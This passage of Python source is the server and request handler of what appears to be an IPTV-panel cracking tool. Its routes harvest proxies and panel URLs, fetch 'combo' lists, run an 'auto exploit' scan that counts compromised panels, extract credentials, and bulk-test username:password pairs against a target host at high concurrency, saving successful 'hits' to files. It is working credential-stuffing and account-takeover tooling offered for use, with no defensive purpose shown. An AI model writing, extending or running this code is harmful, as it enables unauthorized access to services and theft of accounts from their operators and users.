            self._json(200,{"ok":True,"run_id":run_id}); return

        if path=="/api/generate-auto-combos":
            self.send_response(200)
            self.send_header("Content-Type", "application/x-ndjson")
            self.send_header("Cache-Control", "no-cache")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Transfer-Encoding", "chunked")
            self.end_headers()
            wl = threading.Lock(); closed = {"v": False}
            def emit(obj):
                if closed["v"]: return
                try:
                    line = (json.dumps(obj, ensure_ascii=False) + "\n").encode("utf-8")
                    chunk = f"{len(line):X}\r\n".encode("ascii") + line + b"\r\n"
                    with wl: self.wfile.write(chunk); self.wfile.flush()
                except (BrokenPipeError, ConnectionResetError, OSError): closed["v"] = True
            try:
                emit({"type": "info", "msg": "Fetching massive combos from dynamic sources..."})
                res = auto_generate_combos()
                emit({"type": "info", "msg": f"Found {len(res['creds'])} potential combos."})
                emit({"type": "done", "data": res})
            except Exception as e:
                log_exc("autogen_route", e); emit({"type": "error", "msg": str(e)})
            finally:
                try: self.wfile.write(b"0\r\n\r\n"); self.wfile.flush()
                except Exception: pass
            return

        if path=="/api/scan-exploit":
            panels_raw=payload.get("panels") or []
            if not isinstance(panels_raw,list) or not panels_raw:
                self._json(400,{"ok":False,"reason":"missing panels"}); return
            self.send_response(200); self.send_header("Content-Type","application/x-ndjson")
            self.send_header("Cache-Control","no-cache"); self.send_header("Access-Control-Allow-Origin","*")
            self.send_header("Transfer-Encoding","chunked"); self.end_headers()
            wl=threading.Lock(); closed={"v":False}
            def emit(obj):
                if closed["v"]: return
                try:
                    line=(json.dumps(obj,ensure_ascii=False)+"\n").encode("utf-8")
                    chunk=f"{len(line):X}\r\n".encode("ascii")+line+b"\r\n"
                    with wl: self.wfile.write(chunk); self.wfile.flush()
                except (BrokenPipeError,ConnectionResetError,OSError): closed["v"]=True
            emit({"type":"info","msg":"Starting vulnerability scan..."})
            try:
                results = auto_exploit_panels(panels_raw)
                emit({"type":"done","compromised":len(results["panels_compromised"]),"creds":len(results["creds"])})
                emit({"type":"result","data":results})
            except Exception as e:
                emit({"type":"error","msg":str(e)})
            finally:
                try: self.wfile.write(b"0\r\n\r\n"); self.wfile.flush()
                except Exception: pass
            return

        if path=="/api/extract-credentials":
            st=payload.get("source_text","")
            urls=payload.get("panel_urls",[])
            preset=payload.get("pattern_preset","colon")
            if not isinstance(urls,list) or len(urls)>50:
                self._json(400,{"error":"invalid_input"}); return
            if not isinstance(st,str) or len(st)>2000000:
                self._json(400,{"error":"invalid_input"}); return
            for u in urls:
                if not _valid_url(u): self._json(400,{"error":"invalid_input"}); return
            res=extract_credentials_logic(st, urls, preset)
            self._json(200,res); return

        if path=="/api/analyze-combos":
            lines=payload.get("lines") or []
            if not isinstance(lines,list) or not lines:
                self._json(400,{"ok":False,"reason":"missing lines"}); return
            res=analyze_combos(lines)
            self._json(200, res); return

        if path=="/api/harvest":
            extra=payload.get("extra_sources") or []
            if not isinstance(extra, list): extra=[]
            extra=[u for u in extra if isinstance(u,str) and _valid_url(u)]
            urls = SOURCES + extra
            ok_count=0; fail_count=0
            proxies=set(); panels=set()
            with ThreadPoolExecutor(max_workers=min(32, len(urls)+1)) as ex:
                futs={ex.submit(fetch_from_source,u,12):u for u in urls}
                for f in as_completed(futs):
                    u=futs[f]
                    try:
                        got=f.result()
                        if got:
                            ok_count+=1
                            for pr in got: proxies.add(pr.split("://",1)[-1])
                        else: fail_count+=1
                        if "panel" in u.lower() or "player_api" in u.lower():
                            panels.add(u)
                    except Exception: fail_count+=1
            self._json(200,{"ok":True,"sources_ok":ok_count,"sources_fail":fail_count,
                            "proxies":sorted(proxies),"panels":sorted(panels)})
            return

        if path=="/api/forge-proxies":
            proxies=payload.get("proxies") or []
            run_id=str(payload.get("run_id","")).strip()
            if not isinstance(proxies,list) or not proxies:
                self._json(400,{"ok":False,"reason":"missing proxies"}); return
            valid=[p for p in proxies if isinstance(p,str) and _valid_proxy_line(p)]
            if not valid:
                self._json(400,{"ok":False,"reason":"no valid proxy lines"}); return
            st=_run_state(run_id or ("pf_"+str(int(time.time()*1000))))
            st["progress"]={"tested":0,"passed":0,"pool":ADAPT_START}
            self.send_response(200); self.send_header("Content-Type","application/x-ndjson")
            self.send_header("Cache-Control","no-cache"); self.send_header("Access-Control-Allow-Origin","*")
            self.send_header("Transfer-Encoding","chunked"); self.end_headers()
            wl=threading.Lock(); closed={"v":False}
            def emit(obj):
                if closed["v"]: return
                try:
                    line=(json.dumps(obj,ensure_ascii=False)+"\n").encode("utf-8")
                    chunk=f"{len(line):X}\r\n".encode("ascii")+line+b"\r\n"
                    with wl: self.wfile.write(chunk); self.wfile.flush()
                except (BrokenPipeError,ConnectionResetError,OSError): closed["v"]=True
            pool=AdaptivePool(start=ADAPT_START, floor=ADAPT_MIN, ceil=ADAPT_MAX)
            counters={"tested":0,"passed":0}; lock=threading.Lock()
            def worker(line):
                if _run_cancelled(run_id or "") or closed["v"]: return
                hp=line.split("://",1)[-1].split("@")[-1]
                host,port=hp.rsplit(":",1)
                proto="socks5" if "socks5" in line else ("socks4" if "socks4" in line else "http")
                res=forge_proxy(host,int(port),proto)
                success = bool(res)
                grew = pool.record(success)
                if res:
                    out_line=f"{host}:{port}:{res['protocol']}:{res['anonymity']}:{res['latencyMs']}"
                    emit({"type":"result","line":out_line,"score":res["score"]})
                with lock:
                    counters["tested"]+=1
                    if success: counters["passed"]+=1
                    t=counters["tested"]; p=counters["passed"]
                    if t % CHECKPOINT_EVERY == 0:
                        _run_checkpoint(run_id or "", {"tested":t,"passed":p})
                    _run_set_progress(run_id or "", tested=t, passed=p, pool=pool.size())
                if t % 5 == 0 or grew:
                    emit({"type":"progress","tested":t,"passed":p,"pool":pool.size()})
            try:
                idx=0; n=len(valid)
                while idx < n and not closed["v"] and not _run_cancelled(run_id or ""):
                    size=pool.size(); wave=valid[idx:idx+size]; idx+=size
                    with ThreadPoolExecutor(max_workers=len(wave)) as ex:
                        futs=[ex.submit(worker,x) for x in wave]
                        for f in as_completed(futs):
                            if closed["v"] or _run_cancelled(run_id or ""): break
                emit({"type":"done","totalTested":counters["tested"],"totalPassed":counters["passed"]})
            except (BrokenPipeError,ConnectionResetError,OSError): closed["v"]=True
            finally:
                try: self.wfile.write(b"0\r\n\r\n"); self.wfile.flush()
                except Exception: pass
            return

        if path=="/api/probe-panels":
            urls=payload.get("panel_urls") or []
            run_id=str(payload.get("run_id","")).strip()
            if not isinstance(urls,list) or not urls:
                self._json(400,{"ok":False,"reason":"missing panel_urls"}); return
            valid=[u for u in urls if isinstance(u,str) and _valid_url(u)]
            if not valid:
                self._json(400,{"ok":False,"reason":"no valid panel urls"}); return
            st=_run_state(run_id or ("pn_"+str(int(time.time()*1000))))
            st["progress"]={"tested":0,"alive":0,"dead":0,"unknown":0,"pool":ADAPT_START}
            self.send_response(200); self.send_header("Content-Type","application/x-ndjson")
            self.send_header("Cache-Control","no-cache"); self.send_header("Access-Control-Allow-Origin","*")
            self.send_header("Transfer-Encoding","chunked"); self.end_headers()
            wl=threading.Lock(); closed={"v":False}
            def emit(obj):
                if closed["v"]: return
                try:
                    line=(json.dumps(obj,ensure_ascii=False)+"\n").encode("utf-8")
                    chunk=f"{len(line):X}\r\n".encode("ascii")+line+b"\r\n"
                    with wl: self.wfile.write(chunk); self.wfile.flush()
                except (BrokenPipeError,ConnectionResetError,OSError): closed["v"]=True
            pool=AdaptivePool(start=ADAPT_START, floor=ADAPT_MIN, ceil=ADAPT_MAX)
            counters={"tested":0,"alive":0,"dead":0,"unknown":0}; lock=threading.Lock()
            def worker(u):
                if _run_cancelled(run_id or "") or closed["v"]: return
                status=probe_panel(u); pool.record(status=="alive")
                with lock:
                    counters["tested"]+=1; counters[status]+=1; t=counters["tested"]
                    _run_set_progress(run_id or "", tested=t,
                                      alive=counters["alive"], dead=counters["dead"],
                                      unknown=counters["unknown"], pool=pool.size())
                emit({"type":"result","url":u,"status":status})
                if t % 5 == 0:
                    emit({"type":"progress","tested":t,
                          "alive":counters["alive"],"dead":counters["dead"],
                          "unknown":counters["unknown"],"pool":pool.size()})
            try:
                idx=0; n=len(valid)
                while idx < n and not closed["v"] and not _run_cancelled(run_id or ""):
                    size=pool.size(); wave=valid[idx:idx+size]; idx+=size
                    with ThreadPoolExecutor(max_workers=len(wave)) as ex:
                        futs=[ex.submit(worker,x) for x in wave]
                        for f in as_completed(futs):
                            if closed["v"] or _run_cancelled(run_id or ""): break
                emit({"type":"done","tested":counters["tested"],
                      "alive":counters["alive"],"dead":counters["dead"],
                      "unknown":counters["unknown"]})
            except (BrokenPipeError,ConnectionResetError,OSError): closed["v"]=True
            finally:
                try: self.wfile.write(b"0\r\n\r\n"); self.wfile.flush()
                except Exception: pass
            return

        if path=="/api/proxy/fetch":
            try:
                t0=time.time(); alive=extract_alive_unlimited(); elapsed=time.time()-t0
                if not QUIET: print(f"[+] Extract done in {elapsed:.1f}s - alive={len(alive)}")
                if alive: save_alive_proxies(alive)
                set_pool(alive)
                self._json(200,{"ok":True,"alive":len(alive),"scraped":len(alive),"elapsed":round(elapsed,1)})
            except Exception as e: log_exc("proxy_fetch",e); self._json(500,{"ok":False,"reason":str(e)})
            return
        if path=="/api/save-txt":
            try:
                host=str(payload.get("host","unknown_host")).strip()
                hits=payload.get("hits") or []
                base=_host_to_filename(host); fname=f"{base}_{len(hits)}hits.txt"
                body=format_hits_txt(hits)
                with open(fname,"w",encoding="utf-8") as f:
                    f.write(body); f.flush()
                    try: os.fsync(f.fileno())
                    except OSError: pass
                self._json(200,{"ok":True,"filename":fname,
                                 "url":f"/api/download/file?name={urllib.parse.quote(fname)}"})
            except Exception as e: log_exc("save_txt",e); self._json(500,{"ok":False,"reason":str(e)})
            return
        if path=="/api/bulk-stream":
            host=str(payload.get("host","")).strip()
            creds=payload.get("creds") or []
            conc=int(payload.get("concurrency",DEFAULT_THREADS) or DEFAULT_THREADS)
            conc=max(1,min(conc,MAX_THREADS))
            if not host or not isinstance(creds,list) or not creds:
                self._json(400,{"ok":False,"reason":"missing"}); return
            if MAX_CREDS_PER_RUN is not None and len(creds) > MAX_CREDS_PER_RUN:
                self._json(400,{"ok":False,"reason":f"too many creds (> {MAX_CREDS_PER_RUN})"}); return
            if not BULK_SEM.acquire(blocking=False):
                self._json(429,{"ok":False,"reason":"too many concurrent bulk streams"}); return
            try:
                parsed=[]; seen=set()
                for c in creds:
                    if isinstance(c,dict) and c.get("user") and c.get("pass"):
                        u,pw=str(c["user"]).strip(),str(c["pass"]).strip()
                        if not u or not pw or _is_suspicious_creds(u,pw): continue
                        k=u+"\x00"+pw
                        if k in seen: continue
                        seen.add(k); parsed.append((u,pw))
                saver=ResultSaver(".",host)
                self.send_response(200); self.send_header("Content-Type","application/x-ndjson")
                self.send_header("Cache-Control","no-cache"); self.send_header("Access-Control-Allow-Origin","*")
                self.send_header("Transfer-Encoding","chunked"); self.end_headers()
                wl=threading.Lock(); closed={"v":False}
                def emit(obj):
                    if closed["v"]: return
                    try:
                        line=(json.dumps(obj,ensure_ascii=False)+"\n").encode("utf-8")
                        chunk=f"{len(line):X}\r\n".encode("ascii")+line+b"\r\n"
                        with wl: self.wfile.write(chunk); self.wfile.flush()
                    except (BrokenPipeError,ConnectionResetError,OSError): closed["v"]=True
                total=len(parsed); ctr={"done":0,"hits":0}; lock=threading.Lock()
                q = queue.Queue()
                for item in parsed: q.put(item)
                def worker():
                    while not q.empty() and not closed["v"] and not STOP_EVENT.is_set():
                        try: u, pw = q.get_nowait()
                        except queue.Empty: break
                        t0=time.time()
                        res=do_check(host,u,pw,timeout=REQ_TIMEOUT,with_counts=True)
                        lat=int((time.time()-t0)*1000)
                        with lock:
                            ctr["done"]+=1; d=ctr["done"]
                            if res and not res.get("_fail"):
                                ctr["hits"]+=1; h=ctr["hits"]; hit=res
                            else:
                                hit=None
                        if hit:
                            saver.save_hit(f"{u}:{pw}",hit)
                            emit({"type":"hit","hit":hit,"latency_ms":lat,"index":h})
                        else:
                            reason = (res or {}).get("reason","invalid/inactive")
                            emit({"type":"error","user":u,"pass":pw,"reason":reason})
                        if d % 10 == 0:
                            emit({"type":"progress","done":d,"total":total,"hits":ctr["hits"],"latency_ms":lat})
                        q.task_done()
                try:
                    threads = []
                    for _ in range(min(conc, total)):
                        t = threading.Thread(target=worker); t.daemon = True; t.start(); threads.append(t)
                    for t in threads: t.join()
                    emit({"type":"done","checked":ctr["done"],"hits":ctr["hits"]})
                    emit({"type":"file","file":saver.main_filename})
                except (BrokenPipeError,ConnectionResetError,OSError): closed["v"]=True
                finally:
                    try: self.wfile.write(b"0\r\n\r\n"); self.wfile.flush()
                    except Exception: pass
                return
            finally:
                BULK_SEM.release()
        self._json(404,{"ok":False,"reason":"not found"})

def parse_args():
    ap=argparse.ArgumentParser(description=f"{TOOL_NAME} v{TOOL_VERSION}")
    ap.add_argument("--host",default="127.0.0.1")
    ap.add_argument("--port",type=int,default=8081)
    ap.add_argument("--no-open",action="store_true")
    ap.add_argument("--quiet",action="store_true")
    ap.add_argument("--insecure",action="store_true")
    ap.add_argument("-o","--output",default=".")
    return ap.parse_args()

def _install_sigint(server):
    def _h(signum,frame):
        if STOP_EVENT.is_set(): os._exit(1)
        STOP_EVENT.set(); threading.Thread(target=server.shutdown,daemon=True).start()
    signal.signal(signal.SIGINT,_h)

PROCESS_START = time.time()

def main():
    global VERIFY_SSL, INSECURE_MODE, QUIET, _ch
    args=parse_args()
    if args.insecure:
        INSECURE_MODE=True; VERIFY_SSL=False
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        logger.warning("INSECURE MODE")
    if args.quiet:
        QUIET = True
        if _ch is not None:
            try: logger.removeHandler(_ch)
            except Exception: pass
    os.makedirs(args.output,exist_ok=True); os.chdir(args.output)
    _init_crypto()
    init_db()
    cached = load_alive_proxies()
    if cached:
        set_pool(cached)
        logger.info(f"Loaded {len(cached)} cached proxies")
        if not QUIET: print(f"[+] Loaded {len(cached)} cached proxies")
    server=ThreadingHTTPServer((args.host,args.port),Handler)
    _install_sigint(server)
    url=f"http://{args.host}:{args.port}/"
    bg=_find_bg_image()
    if not QUIET:
        print("="*60)
        print(f" {TOOL_NAME} {TOOL_AUTHOR} v{TOOL_VERSION}")
        print(f" Open:   {url}")
        print(f" Output: {os.path.abspath(args.output)}")
        print(f" Background image: {bg if bg else 'NONE (using neon gradient)'}")
        print(f" TLS verify: {'ON' if VERIFY_SSL else 'OFF'}")
        print(f" Encryption: {'ON' if _FERNET else 'OFF'}")
        print(f" M3U fallback: {'ON' if ENABLE_M3U_FALLBACK else 'OFF'}")
        print("="*60)
        print("Press Ctrl+C once to stop gracefully, twice to force exit.")
    if not args.no_open and not QUIET:
        try: webbrowser.open_new_tab(url)
        except Exception as e: log_exc("open_browser",e)
    try: server.serve_forever(poll_interval=0.2)
    finally:
        server.server_close()
        if not QUIET: print("[+] Server stopped.")

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: sys.exit(0)
    except Exception as e:
        log_exc("fatal",e); import traceback; traceback.print_exc(); sys.exit(1)
